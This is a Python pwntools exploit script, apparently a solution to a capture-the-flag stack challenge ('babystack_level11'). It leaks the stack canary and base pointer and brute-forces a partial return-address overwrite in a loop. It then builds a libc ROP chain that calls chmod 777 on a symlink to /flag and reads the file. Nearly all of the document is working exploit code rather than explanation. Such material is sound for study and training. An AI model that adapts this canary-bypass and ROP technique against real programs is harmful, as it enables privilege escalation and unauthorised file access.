from pwn import *
from os import system

def rop(base):
    # ln -s /flag group for symlink to string in libc
    pop_rdi = base + 0x23b6a # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
    pop_rsi = base + 0x2601f # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
    pop_rdx = base + 0x142c92 # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
    pop_rax = base + 0x36174  # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
    syscall = base + 0x2284d  # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "syscall"

    rop = b''
    rop += p64(pop_rdi) 
    rop += p64(base + 0x1eb1f3)  #  ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "group"
    rop += p64(pop_rsi) 
    rop += p64(0o777)         # set permissions to 777
    rop += p64(pop_rdx) + p64(0)         # not used
    rop += p64(pop_rax) 
    rop += p64(0x5a)          # ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "chmod"
    rop += p64(syscall)       # call syscall to execute the ROP chain
    return rop


def exploit_eleven():
    exe = context.binary = ELF('/challenge/babystack_level11')
    context.terminal = ["tmux", "splitw", "-h"]

    def start(argv=[], *a, **kw):
        '''Start the exploit against the target.'''
        if args.GDB:
            return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
        else:
            return process([exe.path] + argv, *a, **kw)

    gdbscript = '''
    tbreak main
    continue
    '''.format(**locals())

    io = start()
    io.recvuntil(b'Here is the value of the base pointer rbp: ')
    bp = int(io.recvline(keepends=False), 16)
    io.sendline(hex(bp-8))
    io.recvuntil(b"is: ")
    canary = int(io.recvline(keepends=False), 16)
    io.recvuntil(b'Here is where it will be stored: ')
    buf = int(io.recvline(keepends=False), 16)
    offset_to_canary = bp-8-buf
    exploit = b'a' * (offset_to_canary) + p64(canary) + b'a'*8 + b'\x83\xc0'
    io.send(exploit)
    print('here exploit')
    byte_value = io.recvline()
    print(byte_value)
    print("after byte received")
    try:
        print("try block")
        io.recvuntil(b'base pointer rbp: ')
        rbp = int(io.recvline(keepends=False), 16)
        io.sendline(hex(rbp+8))
        io.recvuntil(b"is: ")
        # leak = int(io.recvline(keepends=False), 16)
        leak = io.recvline()
        io.recvuntil(b"will be stored: ")
        bufr = int(io.recvline(keepends=False), 16)
        base = int(leak[:-1],16) - 0x23f90 - 0xF3
        print("base")
        print(base)
        payload = b'a' * (rbp-8-bufr) + p64(canary) + b'a'*8 + rop(base)
        # payload = b'a'*(bp-buf)+b'/flag' +b'\0'*3 + rop(base)
        io.send(payload)
        system("cat /flag")
    except:
        print("An exception occurred")

    io.interactive()
       
for i in range(31):
    print("loop "+str(i))
    exploit_eleven()
        
